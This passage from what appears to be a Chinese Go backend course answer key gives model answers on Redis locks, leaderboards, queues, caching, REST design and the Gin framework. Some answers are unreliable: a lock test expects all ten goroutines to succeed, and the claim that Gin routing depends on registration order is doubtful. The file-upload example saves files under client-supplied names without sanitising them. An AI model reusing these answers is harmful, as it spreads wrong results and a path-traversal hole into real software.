- 随机 value：如果直接用固定值（如 `"1"`），A 的锁过期后 B 获取了锁，A 再解锁时会误删 B 的锁。随机 value 确保只能删自己的锁。
- Lua 脚本：`GET + DEL` 必须是原子的。如果分两步执行，GET 后、DEL 前锁过期被别人获取，仍然会误删。

**改值实验**：
- **把 Lua 脚本改成先 GET 再 DEL（两条命令）**：
  ```
  时间线：
  T1: A 执行 GET → value 匹配
  T2: A 的锁过期
  T3: B 通过 SetNX 获取锁
  T4: A 执行 DEL → 删掉了 B 的锁！
  ```
  为什么要注意？→ 这就是著名的「分布式锁误删」问题。Redis 中确保两个操作原子性的唯一方式是 Lua 脚本或事务（MULTI/EXEC）。
  理解什么？→ 分布式系统的时间不可靠——你无法保证 GET 和 DEL 之间锁不过期。

---

### K-61-2 分布式锁防误删 ⭐

**标准答案**：

```go
// 1. WatchDog 锁续期
type RenewalLock struct {
    *RedisLock
    stopCh chan struct{}
}

func (l *RenewalLock) LockWithWatchDog(ctx context.Context, key string, ttl time.Duration) (string, error) {
    value, err := l.Lock(ctx, key, ttl)
    if err != nil {
        return "", err
    }

    l.stopCh = make(chan struct{})
    go func() {
        ticker := time.NewTicker(ttl / 3) // 每 1/3 TTL 续期一次
        defer ticker.Stop()

        renewScript := `
            if redis.call("GET", KEYS[1]) == ARGV[1] then
                return redis.call("EXPIRE", KEYS[1], ARGV[2])
            else
                return 0
            end
        `
        for {
            select {
            case <-ticker.C:
                l.rdb.Eval(ctx, renewScript, []string{key}, value, int64(ttl.Seconds()))
            case <-l.stopCh:
                return
            }
        }
    }()
    return value, nil
}

func (l *RenewalLock) Unlock(ctx context.Context, key, value string) error {
    close(l.stopCh)
    return l.RedisLock.Unlock(ctx, key, value)
}

// 2. 可重入锁
type ReentrantLock struct {
    *RedisLock
}

func (l *ReentrantLock) Lock(ctx context.Context, key string, ttl time.Duration) (string, error) {
    goroutineID := getGoroutineID() // 简化：用协程 ID 标识
    script := `
        local val = redis.call("GET", KEYS[1])
        if val == false then
            redis.call("SET", KEYS[1], ARGV[1] .. ":1")
            redis.call("EXPIRE", KEYS[1], ARGV[2])
            return 1
        elseif string.sub(val, 1, string.len(ARGV[1])) == ARGV[1] then
            local count = tonumber(string.sub(val, string.len(ARGV[1]) + 2)) + 1
            redis.call("SET", KEYS[1], ARGV[1] .. ":" .. count)
            redis.call("EXPIRE", KEYS[1], ARGV[2])
            return 1
        else
            return 0
        end
    `
    result, _ := l.rdb.Eval(ctx, script, []string{key}, goroutineID, int64(ttl.Seconds())).Result()
    if result.(int64) == 0 {
        return "", errors.New("lock already held by another")
    }
    return goroutineID, nil
}

// 3. 并发测试
func TestConcurrentLock() {
    lock := NewRedisLock(rdb)
    key := "test:concurrent:lock"
    var wg sync.WaitGroup
    successCount := int32(0)

    for i := 0; i < 10; i++ {
        wg.Add(1)
        go func(id int) {
            defer wg.Done()
            ctx := context.Background()
            value, err := lock.Lock(ctx, key, 5*time.Second)
            if err == nil {
                atomic.AddInt32(&successCount, 1)
                fmt.Printf("goroutine %d got lock: %s\n", id, value)
                time.Sleep(100 * time.Millisecond)
                lock.Unlock(ctx, key, value)
            }
        }(i)
    }
    wg.Wait()
    fmt.Printf("success count: %d (expect: 10)\n", successCount)
}
```

**换个角度想**：WatchDog 的本质是用一个后台协程不断给锁「续命」，防止业务执行时间超过锁的 TTL 导致锁自动释放。但 WatchDog 也有风险——如果业务进程崩溃，续期停止，锁仍然会在 TTL 后自动释放，不会死锁。这就是为什么 TTL 设得太长不好（死锁风险高），设得太短也不好（锁提前释放），WatchDog 是两者之间的平衡方案。

---

## 第62章 · Redis 实战

### K-62-1 排行榜系统

**标准答案**：

```bash
# Key 设计：rank:articles:hot
# Score 规则：浏览 1 分、点赞 3 分、评论 5 分

# 初始化
ZADD rank:articles:hot 0 "article:1" 0 "article:2" 0 "article:3"

# 更新分数
## 浏览
ZINCRBY rank:articles:hot 1 "article:1"
## 点赞
ZINCRBY rank:articles:hot 3 "article:1"
## 评论
ZINCRBY rank:articles:hot 5 "article:1"

# 查询 Top 10
ZREVRANGE rank:articles:hot 0 9 WITHSCORES

# 查询某篇排名（0-based，从高到低）
ZREVRANK rank:articles:hot "article:1"
# (integer) 0  ← 第一名

# 查询某篇分数
ZSCORE rank:articles:hot "article:1"
```

**Go 代码封装**：
```go
func AddScore(ctx context.Context, articleID string, action string) error {
    key := "rank:articles:hot"
    scores := map[string]float64{
        "view":    1,
        "like":    3,
        "comment": 5,
    }
    score, ok := scores[action]
    if !ok {
        return fmt.Errorf("unknown action: %s", action)
    }
    return rdb.ZIncrBy(ctx, key, score, articleID).Err()
}

func GetTopN(ctx context.Context, n int64) ([]redis.Z, error) {
    return rdb.ZRevRangeWithScores(ctx, "rank:articles:hot", 0, n-1).Result()
}
```

**改值实验**：
- **把点赞从 3 分改成 30 分**：一篇文章被点 10 个赞 = 300 分，而另一篇被浏览 100 次 = 100 分。排行榜由「内容质量」驱动变成了「点赞数」驱动。
  为什么要注意？→ Score 权重决定排行榜的业务含义。权重设计不合理会导致排行榜被单一行为操控。
  理解什么？→ 真实的热度算法远比这个复杂，通常会引入时间衰减（如 HackerNews 算法、Reddit 算法），让老内容自动下沉。

---

### K-62-2 消息队列模拟 ⭐

**标准答案**：

```go
// 生产者
func ProduceTask(ctx context.Context, task map[string]interface{}) error {
    data, _ := json.Marshal(task)
    return rdb.LPush(ctx, "task_queue", data).Err()
}

// 消费者（阻塞等待）
func ConsumeTask(ctx context.Context) {
    for {
        result, err := rdb.BRPop(ctx, 0, "task_queue").Result()
        if err != nil {
            log.Printf("consume error: %v", err)
            continue
        }
        taskJSON := result[1]

        var task map[string]interface{}
        if err := json.Unmarshal([]byte(taskJSON), &task); err != nil {
            log.Printf("parse error: %v", err)
            continue
        }

        err = processTask(task)
        if err != nil {
            log.Printf("process failed, move to backup: %v", err)
            // 失败任务转移到备份队列
            rdb.RPush(ctx, "task_queue:failed", taskJSON)
        }
    }
}

// 使用 RPOPLPUSH 实现可靠消费（消费前先备份）
func ConsumeTaskReliable(ctx context.Context) {
    for {
        val, err := rdb.RPopLPush(ctx, "task_queue", "task_queue:processing").Result()
        if err != nil {
            if errors.Is(err, redis.Nil) {
                time.Sleep(time.Second)
                continue
            }
            log.Printf("error: %v", err)
            continue
        }

        var task map[string]interface{}
        json.Unmarshal([]byte(val), &task)

        if err := processTask(task); err != nil {
            // 失败：保留在 processing 队列，人工排查
            log.Printf("task failed: %v", err)
        } else {
            // 成功：从 processing 队列移除
            rdb.LRem(ctx, "task_queue:processing", 1, val)
        }
    }
}
```

**解析**：
- `BRPOP key 0`：阻塞弹出，timeout=0 表示无限等待。有消息立即返回，无消息阻塞直到有数据。
- `RPOPLPUSH`：原子操作——从源队列弹出并推入目标队列。消费前先备份，即使消费者崩溃，任务在 `processing` 队列中不会丢失。
- 这不是真正的消息队列（没有确认机制、没有持久化保证），但作为轻量级任务队列够用。

**改值实验**：
- **把 `BRPOP` 的 timeout 从 0 改成 5**：每 5 秒超时返回一次 nil，需要循环重试。如果消费者处理逻辑中忘了循环，消费者就会停止工作。
  为什么要注意？→ timeout=0 是最简单的「一直等」模式。设置非零 timeout 需要处理好 `redis.Nil` 返回值。
  理解什么？→ `BRPOP` 的 timeout 是等待超时，不是任务处理超时。任务处理时间由你的 `processTask` 决定。

---

## 第63章 · Go + Redis

### K-63-1 缓存旁路模式实现

**标准答案**：
```go
package main

import (
    "context"
    "encoding/json"
    "errors"
    "fmt"
    "time"

    "github.com/redis/go-redis/v9"
    "gorm.io/gorm"
)

type Article struct {
    ID        int64     `json:"id"`
    Title     string    `json:"title"`
    Content   string    `json:"content"`
    ViewCount int       `json:"view_count"`
    CreatedAt time.Time `json:"created_at"`
}

var (
    rdb *redis.Client
    db  *gorm.DB
)

func GetArticle(ctx context.Context, id int64) (*Article, error) {
    key := fmt.Sprintf("article:%d", id)

    // 1. 查 Redis
    val, err := rdb.Get(ctx, key).Result()
    if err == nil {
        var article Article
        json.Unmarshal([]byte(val), &article)
        return &article, nil
    }
    if !errors.Is(err, redis.Nil) {
        // Redis 异常，降级到 MySQL
        log.Printf("redis error: %v, fallback to mysql", err)
    }

    // 2. 查 MySQL
    var article Article
    if err := db.First(&article, id).Error; err != nil {
        if errors.Is(err, gorm.ErrRecordNotFound) {
            return nil, fmt.Errorf("article not found")
        }
        return nil, err
    }

    // 3. 回写 Redis
    data, _ := json.Marshal(article)
    rdb.Set(ctx, key, data, 10*time.Minute)

    return &article, nil
}

func UpdateArticle(ctx context.Context, art *Article) error {
    // 1. 先更新 MySQL
    if err := db.Save(art).Error; err != nil {
        return err
    }

    // 2. 删除 Redis 缓存（而非更新）
    key := fmt.Sprintf("article:%d", art.ID)
    rdb.Del(ctx, key)

    return nil
}
```

**解析**：
- Cache-Aside 模式：读（Cache → DB → 回写 Cache），写（DB → 删 Cache）。这是最经典的缓存模式。
- 写时「删缓存」而非「更新缓存」：更新缓存有并发写入顺序问题（先写的可能后到达），删缓存更安全。
- Redis 不可用时：`!errors.Is(err, redis.Nil)` 区分「key 不存在」和「Redis 挂了」。后者降级直接查 DB。

**改值实验**：
- **把写操作中的「删缓存」改成「更新缓存」**：
  ```
  并发场景：
  T1: 更新 MySQL（title="A"）
  T2: 更新 MySQL（title="B"）
  T2: 更新 Redis（title="B"）
  T1: 更新 Redis（title="A"） ← 把 T2 的更新覆盖了！
  最终：MySQL=title="B", Redis=title="A" → 不一致
  ```
  为什么要注意？→ 并发更新场景下，更新缓存的顺序和更新 DB 的顺序可能不一致。删除缓存不存在这个问题——删了之后下次读会重新从 DB 加载最新值。
  理解什么？→ Cache-Aside 的 write invalidation（写失效）优于 write update（写更新）。

---

### K-63-2 防缓存击穿 ⭐

**标准答案**：

```go
import "golang.org/x/sync/singleflight"

var sg singleflight.Group

func GetArticleWithSingleflight(ctx context.Context, id int64) (*Article, error) {
    key := fmt.Sprintf("article:%d", id)

    // 1. 查 Redis
    val, err := rdb.Get(ctx, key).Result()
    if err == nil {
        var article Article
        json.Unmarshal([]byte(val), &article)
        return &article, nil
    }

    // 2. 使用 singleflight 合并并发请求
    v, err, _ := sg.Do(key, func() (interface{}, error) {
        // 双重检查：拿到 singleflight 锁后再查一次 Redis
        val, err := rdb.Get(ctx, key).Result()
        if err == nil {
            var article Article
            json.Unmarshal([]byte(val), &article)
            return &article, nil
        }

        // 查 MySQL
        var article Article
        if err := db.First(&article, id).Error; err != nil {
            return nil, err
        }

        // 回写 Redis
        data, _ := json.Marshal(article)
        rdb.Set(ctx, key, data, 10*time.Minute)
        return &article, nil
    })

    if err != nil {
        return nil, err
    }
    return v.(*Article), nil
}

// 并发测试
func TestSingleflight() {
    var wg sync.WaitGroup
    for i := 0; i < 100; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            article, err := GetArticleWithSingleflight(context.Background(), 1)
            fmt.Printf("article: %v, err: %v\n", article.Title, err)
        }()
    }
    wg.Wait()
    // 预期：即使 100 个并发请求同时发现缓存未命中，也只有一个请求查询 MySQL
}
```

**解析**：
- `singleflight.Group.Do(key, fn)`：同一 key 的并发调用，只执行一次 fn，其他调用者共享结果。
- 双重检查：拿到 singleflight 后再次查 Redis。因为第一个请求可能已经重建了缓存。
- 这是 Go 官方提供的工具（`golang.org/x/sync/singleflight`），无需自己实现。

**改值实验**：
- **去掉双重检查（singleflight 内不查 Redis）**：第一个请求重建缓存后，第二个请求还要等 singleflight 返回 → 但返回的结果就是第一个请求查 DB 的结果，结果正确，只是多了一次不必要的等待。但如果 singleflight 执行时间很长（DB 慢），双重检查可以让后来的请求直接命中缓存，不需要等待。
  为什么要注意？→ 双重检查在 singleflight 场景中不是必须的（因为结果共享），但可以减少等待时间。
  理解什么？→ singleflight 的核心价值是「合并请求」，不仅防止击穿 DB，还减少了重复计算。

---

## 第65章 · RESTful API

### K-65-1 设计 RESTful API 文档

**标准答案**：

#### 文章（Articles）

```
GET /api/v1/articles?page=1&size=10&tag=golang
→ 200 OK
{
  "code": 0,
  "data": {
    "items": [
      {"id": 1, "title": "Go入门", "author": "张三", "tags": ["golang"], "created_at": "..."}
    ],
    "total": 42,
    "page": 1,
    "size": 10
  }
}

POST /api/v1/articles
Content-Type: application/json
{
  "title": "Go入门",
  "content": "...",
  "tags": ["golang", "backend"]
}
→ 201 Created
{
  "code": 0,
  "data": {"id": 1, "title": "Go入门", "created_at": "..."}
}

GET /api/v1/articles/1
→ 200 OK
{
  "code": 0,
  "data": {"id": 1, "title": "Go入门", "content": "...", "tags": [...], "author": {...}}
}

PUT /api/v1/articles/1
{
  "title": "Go进阶",
  "content": "..."
}
→ 200 OK {"code": 0, "data": {...}}

DELETE /api/v1/articles/1
→ 204 No Content
```

#### 评论（Comments）

```
GET /api/v1/articles/1/comments?page=1&size=20
→ 200 OK {"code": 0, "data": {"items": [...], "total": 5}}

POST /api/v1/articles/1/comments
{"content": "好文章!", "parent_id": null}
→ 201 Created

DELETE /api/v1/articles/1/comments/5
→ 204 No Content
```

#### 用户（Users）

```
POST /api/v1/users/register
{"username": "alice", "email": "alice@example.com", "password": "your_password"}
→ 201 Created

POST /api/v1/users/login
{"email": "alice@example.com", "password": "your_password"}
→ 200 OK {"code": 0, "data": {"access_token": "...", "refresh_token": "..."}}

GET /api/v1/users/me
Authorization: Bearer <token>
→ 200 OK {"code": 0, "data": {"id": 1, "username": "alice", "email": "..."}}

PUT /api/v1/users/me
{"bio": "Go开发者"}
→ 200 OK
```

**换个角度想**：RESTful 设计的核心原则：资源用名词复数（`/articles` 而非 `/getArticles`）、HTTP 方法表示动作（GET/POST/PUT/DELETE）、嵌套资源表示层级关系（`/articles/1/comments`）。URL 应该让一个有经验的开发者不看文档就能猜到含义。

---

### K-65-2 RESTful 命名审查

**标准答案**：

| 原 API | 问题 | 修正 |
|--------|------|------|
| `POST /api/createArticle` | 动词在 URL 中（create），应使用 HTTP 方法表达动作 | `POST /api/v1/articles` |
| `GET /api/getArticles?page=1` | 同上，get 冗余 | `GET /api/v1/articles?page=1` |
| `POST /api/articles/123/delete` | 删除用 POST + URL 含 delete，应 DELETE + 资源定位 | `DELETE /api/v1/articles/123` |
| `GET /api/articlesByUser?userId=5` | 资源层级关系应通过路径表达 | `GET /api/v1/users/5/articles` |
| `PUT /api/articles/updateTitle/123` | URL 含动作（updateTitle），且 ID 位置错误 | `PATCH /api/v1/articles/123`（body: `{"title": "new"}`） |

**换个角度想**：REST 不是教条。如果你的业务逻辑确实复杂到无法用 CRUD 建模（如「审核文章」），可以接受动作型端点：`POST /api/v1/articles/123/approve`。但能资源化的尽量资源化。

---

### K-65-3 API 版本管理策略 ⭐

**标准答案**：

**1. URL 路径版本 vs Header 版本**：
选择 **URL 路径版本**（`/api/v1/...`、`/api/v2/...`）。

理由：
- 直观可见，curl/浏览器直接调试方便
- 易于 Nginx/网关层面做路由
- 不依赖客户端正确设置 Header
- 缺点：URL 变更需客户端配合，但这是"可见的破坏性变更"

**2. 旧版本废弃（Deprecation）流程**：
```
阶段 1（T+0）：发布新版本 v3，v1 和 v2 保持可用
阶段 2（T+30d）：API 响应头添加 Deprecation: true 和 Sunset: <日期>
                  同时在文档和邮件中通知所有调用方
阶段 3（T+60d）：v1 接口返回 410 Gone 或仅保留核心接口
阶段 4（T+90d）：完全下线 v1
```

**3. v2 修改字段名兼容 v1**：
```
方案：响应适配层

type ArticleV1 struct {
    Title string `json:"title"`
}
type ArticleV2 struct {
    ArticleName string `json:"article_name"`
}

// v1 客户端访问 /api/v1/articles 时：
func GetArticleV1(c *gin.Context) {
    art := service.GetArticle(c.Param("id"))
    c.JSON(200, ArticleV1{Title: art.ArticleName})
}
// v2 客户端访问 /api/v2/articles 时：
func GetArticleV2(c *gin.Context) {
    art := service.GetArticle(c.Param("id"))
    c.JSON(200, art)  // 直接返回 v2 结构
}
```

**换个角度想**：API 版本管理的本质是「契约演进」。最差的做法是直接改字段名导致所有客户端崩溃。最好的做法是：新版本独立部署，旧版本保留到所有客户端迁移完毕。如果你的改动是「只增不减」（只加新字段、不改旧字段名），甚至不需要新版本号。

---

## 第66章 · Gin 框架

### K-66-1 Gin Hello World

**标准答案**：
```go
package main

import (
    "net/http"

    "github.com/gin-gonic/gin"
)

func main() {
    r := gin.Default()

    r.GET("/ping", func(c *gin.Context) {
        c.JSON(http.StatusOK, gin.H{"message": "pong"})
    })

    r.GET("/hello", func(c *gin.Context) {
        name := c.DefaultQuery("name", "世界")
        c.JSON(http.StatusOK, gin.H{"message": "你好, " + name})
    })

    r.Run(":8080")
}
```

验证：
```bash
curl http://localhost:8080/ping        # {"message":"pong"}
curl "http://localhost:8080/hello?name=世界"   # {"message":"你好, 世界"}
curl http://localhost:8080/hello       # {"message":"你好, 世界"}
```

**解析**：
- `gin.Default()`：自带 Logger 和 Recovery 中间件。
- `c.DefaultQuery("name", "世界")`：获取 query 参数，不存在时使用默认值。
- `gin.H`：`map[string]interface{}` 的简写，用于构建 JSON 响应。

**改值实验**：
- **把 `gin.Default()` 改成 `gin.New()`**：Logger 和 Recovery 中间件不会被自动添加。如果 handler 中 panic，服务直接崩溃而非返回 500。
  为什么要注意？→ 生产环境至少保留 Recovery 中间件，防止单个请求的 panic 导致整个进程退出。
  理解什么？→ `gin.Default()` = `gin.New()` + `Use(Logger())` + `Use(Recovery())`。

---

### K-66-2 Gin 路由分组

**标准答案**：
```go
func main() {
    r := gin.Default()

    api := r.Group("/api")
    {
        v1 := api.Group("/v1")
        {
            users := v1.Group("/users")
            {
                users.GET("", listUsers)
                users.GET("/:id", getUser)
                users.POST("", createUser)
                users.PUT("/:id", updateUser)
                users.DELETE("/:id", deleteUser)
            }

            articles := v1.Group("/articles")
            {
                articles.GET("", listArticles)
                articles.GET("/:id", getArticle)
            }
        }
    }

    r.Run(":8080")
}
```

**解析**：
- 路由分组的好处：共享中间件（如 `/api/v1` 组加认证中间件）、代码组织清晰、便于版本管理。
- 注意 URL 中用户的路径不应重复 `/users`（嵌套 group 已包含该前缀）。

**改值实验**：
- **把 `users.GET("", ...)` 写成 `users.GET("/", ...)`**：前者匹配 `/api/v1/users`，后者匹配 `/api/v1/users/`。Gin 默认不严格区分尾斜杠，但仍建议保持一致。
  为什么要注意？→ 尾斜杠的不一致可能导致某些严格的 API 客户端 404。统一使用无尾斜杠风格是最常见的做法。

---

### K-66-3 优雅关停 ⭐

**标准答案**：
```go
package main

import (
    "context"
    "log"
    "net/http"
    "os"
    "os/signal"
    "syscall"
    "time"

    "github.com/gin-gonic/gin"
)

func main() {
    r := gin.Default()
    r.GET("/ping", func(c *gin.Context) {
        time.Sleep(2 * time.Second) // 模拟慢处理
        c.JSON(200, gin.H{"message": "pong"})
    })

    srv := &http.Server{
        Addr:    ":8080",
        Handler: r,
    }

    go func() {
        if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
            log.Fatalf("listen: %s\n", err)
        }
    }()

    quit := make(chan os.Signal, 1)
    signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
    <-quit
    log.Println("Shutting down server...")

    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()

    if err := srv.Shutdown(ctx); err != nil {
        log.Fatalf("Server forced to shutdown: %v", err)
    }
    log.Println("Server exiting")
}
```

**解析**：
- `signal.Notify(quit, SIGINT, SIGTERM)`：监听 Ctrl+C（SIGINT）和 kill（SIGTERM）信号。
- `srv.Shutdown(ctx)`：不再接受新请求，等待现有请求完成。`ctx` 的 5 秒超时防止无限等待。
- `http.ErrServerClosed`：Shutdown 后 ListenAndServe 返回这个错误，是预期的，不应 panic。

**改值实验**：
- **把 5 秒超时改成 0 秒**：`srv.Shutdown` 立刻返回，正在处理的慢请求被中断。客户端收到连接断开错误。
  为什么要注意？→ 超时太短可能导致正在处理的交易半途中断；超时太长可能导致发布过程耗时过久。合理的值取决于你的最长业务处理时间。
  理解什么？→ 优雅关停是生产部署的基础要求。没有它的系统，每次重启都会导致一部分请求 5xx。

---

## 第67章 · Gin 路由

### K-67-1 RESTful 风格路由设计

**标准答案**：
```go
func setupRoutes(r *gin.Engine) {
    v1 := r.Group("/api/v1")
    {
        tasks := v1.Group("/tasks")
        {
            tasks.GET("", listTasks)
            tasks.POST("", createTask)
            tasks.GET("/:id", getTask)
            tasks.PUT("/:id", updateTask)
            tasks.DELETE("/:id", deleteTask)
            tasks.PATCH("/:id/status", updateTaskStatus)
        }
    }
}

func listTasks(c *gin.Context) {
    status := c.Query("status")
    priority := c.Query("priority")
    page := c.DefaultQuery("page", "1")
    size := c.DefaultQuery("size", "10")
    // ... 查询逻辑
}

func updateTaskStatus(c *gin.Context) {
    id := c.Param("id")
    var body struct {
        Status string `json:"status"`
    }
    c.ShouldBindJSON(&body)
    // ... 更新状态
}
```

**解析**：
- `PATCH /:id/status`：部分更新，只修改状态字段，语义比 PUT 更精确。
- `c.DefaultQuery`：给分页参数提供默认值，防止客户端不传导致错误。
- 查询参数名应与文档保持一致（`status`、`priority`、`page`、`size`）。

**改值实验**：
- **把 `PATCH /:id/status` 改成 `POST /:id/status`**：功能上能跑，但语义混乱。POST 通常用于创建新资源，而这里是修改已有资源的属性。
  为什么要注意？→ HTTP 方法的语义约定是 RESTful API 可读性的基础。破坏了语义，其他开发者需要额外阅读文档来理解每个接口的行为。

---

### K-67-2 路由优先级与冲突

**标准答案**：

有问题！`/users/me` 会被 `/users/:id` 抢先匹配。
```go
r.GET("/users/:id", handleUser)          // :id 匹配 "me"
r.GET("/users/me", handleMe)             // 永远不会被匹配！
```

Gin 基于 radix tree 的路由，优先匹配注册顺序中先出现的模式。`:id` 通配符可以匹配任何字符串（包括 "me"），所以第一个路由会吞掉 `/users/me`。

**修正**：
```go
// 方案 1：调整注册顺序（固定路径在前）
r.GET("/users/me", handleMe)             // 先注册固定路径
r.GET("/users/:id", handleUser)          // 后注册通配路径

// 方案 2：在 handleUser 中手动判断
func handleUser(c *gin.Context) {
    if c.Param("id") == "me" {
        handleMe(c)
        return
    }
    // ...
}
```

`/users/:id/articles/:aid` 和 `/users/:id/posts/:pid` 没有冲突，因为 `articles` 和 `posts` 是固定段，Gin 能区分。

**换个角度想**：这是 radix tree 路由的经典陷阱。如果框架不支持优先级（如某些框架固定路由优先于通配路由），你就必须手动管理注册顺序。最佳实践：所有路由文件中，先注册固定路径，再注册通配路径。

---

### K-67-3 动态路由中间件 ⭐

**标准答案**：
```go
func DynamicRateLimiter() gin.HandlerFunc {
    writeLimiter := rate.NewLimiter(10, 10)   // 10 req/s
    readLimiter := rate.NewLimiter(100, 100)   // 100 req/s

    return func(c *gin.Context) {
        path := c.Request.URL.Path
        var limiter *rate.Limiter

        if strings.HasPrefix(path, "/api/v1/write/") {
            limiter = writeLimiter
        } else if strings.HasPrefix(path, "/api/v1/read/") {
            limiter = readLimiter
        } else {
            c.Next()
            return
        }

        if !limiter.Allow() {
            c.AbortWithStatusJSON(http.StatusTooManyRequests, gin.H{
                "code":    429,
                "message": "rate limit exceeded",
            })
            return
        }
        c.Next()
    }
}
```

**解析**：
- 使用 `golang.org/x/time/rate` 的令牌桶实现。`rate.NewLimiter(10, 10)` = 每秒生成 10 个令牌，桶容量 10。
- `c.Next()`：放行给下一个中间件/handler。`c.AbortWithStatusJSON()`：终止请求处理。
- 路径前缀匹配使用 `strings.HasPrefix`，如果路由规则更复杂，可改用正则或 radix tree。

**改值实验**：
- **把 `rate.NewLimiter(10, 10)` 改成 `rate.NewLimiter(10, 1)`**：桶容量从 10 降到 1。在突发流量下，前 10 个请求可以通过（容量 10），改为只有 1 个可以立即通过。
  为什么要注意？→ 桶容量决定了允许的突发流量大小。容量 1 意味着绝对平滑（每秒均匀处理），容量 10 意味着允许瞬间 10 个请求同时通过。
  理解什么？→ 限流不是越严格越好。合理的 burst 可以让正常用户在 page load 时同时加载的多个请求不被限流。

---

## 第68章 · Gin 请求参数绑定

### K-68-1 各种参数绑定方式练习

**标准答案**：
```go
func main() {
    r := gin.Default()

    // 1. Query 参数
    r.GET("/search", func(c *gin.Context) {
        var q struct {
            Keyword string `form:"keyword"`
            Page    int    `form:"page"`
            Size    int    `form:"size"`
        }
        c.ShouldBindQuery(&q)
        c.JSON(200, q)
    })
    // curl "http://localhost:8080/search?keyword=golang&page=2&size=10"

    // 2. Path 参数
    r.GET("/users/:uid/articles/:aid", func(c *gin.Context) {
        uid := c.Param("uid")
        aid := c.Param("aid")
        c.JSON(200, gin.H{"user_id": uid, "article_id": aid})
    })
    // curl http://localhost:8080/users/123/articles/456

    // 3. Form 参数
    r.POST("/login", func(c *gin.Context) {
        var form struct {
            Username string `form:"username"`
            Password string `form:"password"`
        }
        c.ShouldBind(&form) // Content-Type: application/x-www-form-urlencoded
        c.JSON(200, gin.H{"username": form.Username})
    })
    // curl -X POST http://localhost:8080/login -d "username=alice&password=123456"

    // 4. JSON Body
    r.POST("/articles", func(c *gin.Context) {
        var article struct {
            Title   string `json:"title" binding:"required"`
            Content string `json:"content"`
        }
        c.ShouldBindJSON(&article)
        c.JSON(201, article)
    })
    // curl -X POST http://localhost:8080/articles -H "Content-Type: application/json" -d '{"title":"Go入门","content":"..."}' 

    // 5. Header 绑定
    r.GET("/header", func(c *gin.Context) {
        var h struct {
            RequestID string `header:"X-Request-ID"`
            Token     string `header:"Authorization"`
        }
        c.ShouldBindHeader(&h)
        c.JSON(200, h)
    })
    // curl http://localhost:8080/header -H "X-Request-ID: abc-123" -H "Authorization: Bearer xxx"

    // 6. 文件上传
    r.POST("/upload", func(c *gin.Context) {
        file, err := c.FormFile("file")
        if err != nil {
            c.JSON(400, gin.H{"error": err.Error()})
            return
        }
        dst := "./uploads/" + file.Filename
        c.SaveUploadedFile(file, dst)
        c.JSON(200, gin.H{"filename": file.Filename, "size": file.Size})
    })
    // curl -X POST http://localhost:8080/upload -F "file=@test.txt"

    r.Run(":8080")
}
```

**解析**：
- `ShouldBind`：根据 Content-Type 自动选择绑定方式（JSON/Form/Query）。
- `ShouldBindJSON`：强制只从 JSON body 绑定。
- `ShouldBindQuery`：从 URL Query 参数绑定。
- `ShouldBindHeader`：从 HTTP Header 绑定。
- `binding:"required"`：Gin 内置的校验 tag，字段为空返回 400。

**改值实验**：
- **把 `c.ShouldBindJSON(&article)` 改成 `c.ShouldBind(&article)` 后在 POST 时使用 `application/x-www-form-urlencoded`**：同样能绑定，但同时也可以用 JSON。ShouldBind 根据 Content-Type 自动选择，更灵活但可能有安全隐患（攻击者可以用不同 Content-Type 绕过某些校验）。
  为什么要注意？→ 如果接口约定只接受 JSON，用 `ShouldBindJSON` 更安全。`ShouldBind` 的自动推断可能被利用。

---

### K-68-2 自定义绑定验证器 ⭐

**标准答案**：
```go
package main

import (
    "time"
    "github.com/gin-gonic/gin"
    "github.com/gin-gonic/gin/binding"
    "github.com/go-playground/validator/v10"
)

func init() {
    if v, ok := binding.Validator.Engine().(*validator.Validate); ok {
        v.RegisterValidation("valid_date", validateDate)
    }
}

func validateDate(fl validator.FieldLevel) bool {
    dateStr := fl.Field().String()
    if dateStr == "" {
        return true // 空值由 required 校验
    }

    t, err := time.Parse("2006-01-02", dateStr)
    if err != nil {
        return false
    }

    // 不能是未来日期
    if t.After(time.Now().Truncate(24 * time.Hour)) {
        return false
    }
    return true
}

func main() {
    r := gin.Default()

    r.POST("/event", func(c *gin.Context) {
        var req struct {
            Name      string `json:"name" binding:"required"`
            EventDate string `json:"event_date" binding:"required,valid_date"`
        }
        if err := c.ShouldBindJSON(&req); err != nil {
            c.JSON(400, gin.H{"error": err.Error()})
            return
        }
        c.JSON(200, gin.H{"message": "ok"})
    })

    r.Run(":8080")
}
```

验证：
```bash
# ✅ 合法日期
curl -X POST :8080/event -H "Content-Type: application/json" -d '{"name":"会议","event_date":"2024-01-15"}'

# ❌ 未来日期
curl -X POST :8080/event -H "Content-Type: application/json" -d '{"name":"会议","event_date":"2030-01-01"}'

# ❌ 非法格式
curl -X POST :8080/event -H "Content-Type: application/json" -d '{"name":"会议","event_date":"2024-13-01"}'
```

**解析**：
- `binding.Validator.Engine()`：获取 Gin 底层的 `validator.Validate` 实例，注册自定义规则。
- `time.Parse("2006-01-02", ...)`：Go 独特的日期格式——2006-01-02 是 Go 的参考时间（Mon Jan 2 15:04:05 MST 2006）。
- `Truncate(24 * time.Hour)`：截断到当天零点，使"今天"的日期不被当作未来日期。

---

## 第69章 · Gin 中间件

### K-69-1 自定义日志中间件

**标准答案**：
```go
func LoggerMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        start := time.Now()
        path := c.Request.URL.Path
        rawQuery := c.Request.URL.RawQuery

        c.Next()

        latency := time.Since(start).Milliseconds()
        status := c.Writer.Status()
        ip := c.ClientIP()

        logEntry := map[string]interface{}{
            "method":     c.Request.Method,
            "path":       path,
            "query":      rawQuery,
            "status":     status,
            "latency_ms": latency,
            "ip":         ip,
        }

        jsonLog, _ := json.Marshal(logEntry)
        fmt.Println(string(jsonLog))
    }
}

func main() {
    r := gin.New()
    r.Use(LoggerMiddleware(), gin.Recovery())
    r.GET("/api/v1/users", func(c *gin.Context) {
        c.JSON(200, gin.H{"message": "ok"})
    })
    r.Run(":8080")
}
```

**解析**：
- `start := time.Now()` 在 `c.Next()` 之前记录开始时间，确保计算完整处理耗时。
- `c.Next()`：调用后续中间件和 handler。必须在对响应进行操作之前调用，否则无法捕获 status code。
- `c.ClientIP()`：Gin 内置方法，自动处理 X-Forwarded-For 等代理头。

**改值实验**：
- **把 `start := time.Now()` 放在 `c.Next()` 之后**：latency 总是接近 0，因为只测量了 `json.Marshal` 和 `fmt.Println` 的时间。
